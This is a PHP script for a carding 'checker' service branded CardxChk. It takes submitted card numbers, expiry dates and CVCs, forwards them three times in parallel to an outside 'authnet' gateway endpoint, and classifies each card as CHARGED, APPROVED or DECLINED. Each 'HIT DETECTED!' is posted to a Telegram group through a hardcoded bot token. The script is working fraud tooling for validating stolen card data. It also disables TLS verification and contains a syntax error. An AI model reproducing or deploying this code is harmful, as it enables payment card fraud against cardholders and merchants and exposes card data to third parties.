<?php
header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
$validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

$expectedApiKey = $validation['response']['apiKey'];
$providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging
$log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response) {
    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Skip 3DS responses
    if (is3DAuthenticationResponse($response)) {
        log_message("Skipping Telegram notification for 3DS response: $response");
        return;
    }

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}


// Extract card details
$card_number = $_POST['card']['number'];
$exp_month = str_pad($_POST['card']['exp_month'], 2, '0', STR_PAD_LEFT); // Ensure MM format
$exp_year = $_POST['card']['exp_year'];
$cvc = $_POST['card']['cvc'];

// Normalize exp_year to 4 digits if it's 2 digits (YY)
if (strlen($exp_year) === 2) {
    $exp_year = (intval($exp_year) < 50 ? '20' : '19') . $exp_year;
} elseif (strlen($exp_year) !== 4 || !is_numeric($exp_year)) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid year format']);
    exit;
}

// Format cc string: number|month|year|cvc
$cc = $card_number . '|' . $exp_month . '|' . $exp_year . '|' . $cvc;

// API URL
$api_url_base = 'https://rockyalways.onrender.com/gateway=authnet1$/key=rockysoon?cc=';

// Function to make parallel API request
function makeRequest($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    return $error ? false : $response;
}

// Create 3 parallel requests with slight variations (e.g., adding random delay to simulate different attempts)
$responses = [];
$multi_handle = curl_multi_init();

$channels = [];
for ($i = 0; $i < 3; $i++) {
    $url = $api_url_base . urlencode($cc) . '&attempt=' . $i . '&rand=' . mt_rand();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_multi_add_handle($multi_handle, $ch);
    $channels[$i] = $ch;
}

$active = null;
do {
    curl_multi_exec($multi_handle, $active);
    usleep(10000); // Small delay to prevent CPU overload
} while ($active > 0);

foreach ($channels as $i => $ch) {
    $response = curl_multi_getcontent($ch);
    if ($response !== false) {
        $responses[$i] = $response;
    }
    curl_multi_remove_handle($multi_handle, $ch);
}
curl_multi_close($multi_handle);

// Process responses
$best_response = ['status' => 'DECLINED', 'message' => 'All attempts failed'];
foreach ($responses as $response) {
    if ($response !== false) {
        $data = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($data['message'], $data['status'])) {
            $best_response = $data;
            break; // Take the first valid response
        }
    }
}

if (json_last_error() !== JSON_ERROR_NONE) {
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid API response']);
    exit;
}

// Extract message and status
$message = $best_response['message'] ?? 'Unknown error';
$api_status = $best_response['status'] ?? 'UNKNOWN';

// Lowercase for case-insensitive comparison
$message_lower = strtolower($message);

// Define phrase arrays
$charged_phrases = [
    'transaction approved',
    'payment successful',
    'transaction complete',
    'approved',
    'success',
    'payment processed',
    'thank you for your payment'
];

$approved_phrases = [
    'cvv',
    'card code',
    'security code',
    'cvv2',
    'cvc',
    'cvv does not match',
    'security code'
];

$declined_phrases = [
    'failed',
    'declined',
    'transaction declined',
    'card declined',
    'insufficient funds',
    'invalid card',
    'expired card',
    'this transaction has been declined'
];

// Determine status
$our_status = 'DECLINED';

// Check for CHARGED
foreach ($charged_phrases as $phrase) {
    if (strpos($message_lower, $phrase) !== false) {
        $our_status = 'CHARGED';
        break;
    }
}

// If not CHARGED, check for APPROVED (CVV related)
if ($our_status === 'DECLINED') {
    foreach ($approved_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $our_status = 'APPROVED';
            break;
        }
    }
}

// If still DECLINED, confirm with declined phrases or default
if ($our_status === 'DECLINED') {
    $is_declined = false;
    foreach ($declined_phrases as $phrase) {
        if (strpos($message_lower, $phrase) !== false) {
            $is_declined = true;
            break;
        }
    }
    if (!$is_declined && $api_status !== 'DECLINED') {
        $our_status = 'DECLINED';
    }
}

// Prepare output message
$our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');

// Output JSON response
echo json_encode(['status' => $our_status, 'message' => $our_message]);
?>
